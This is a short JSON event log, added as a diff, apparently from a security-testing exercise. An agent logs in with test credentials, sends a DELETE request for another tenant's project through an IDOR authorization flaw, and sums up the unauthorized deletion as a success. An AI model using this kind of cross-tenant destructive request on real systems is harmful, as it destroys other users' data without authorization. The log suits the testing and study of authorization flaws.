@@ -1,0 +1,38 @@
+[
+  {
+    "event_id": "evt_9d21892a45c745ad9eba9da54803d41b",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": {
+        "email": "user_61359338@exercise.invalid",
+        "password": "pw_bc588e90848d35e7"
+      },
+      "method": "POST",
+      "path": "/auth/login",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "event_id": "evt_448170dbae7a4f5c8c16f014e09880d1",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": null,
+      "method": "DELETE",
+      "path": "/v1/projects/ee5d807f-a04e-49f0-865f-66180224adaa",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "status": "success",
+    "summary": "Signed in as user_61359338@exercise.invalid and exploited the broken object-level authorization (IDOR) on DELETE /v1/projects/{id} to delete project ee5d807f-a04e-49f0-865f-66180224adaa, which belongs to a different tenant. The server returned 200 OK, confirming the unauthorized deletion.",
+    "type": "finish"
+  }
+]
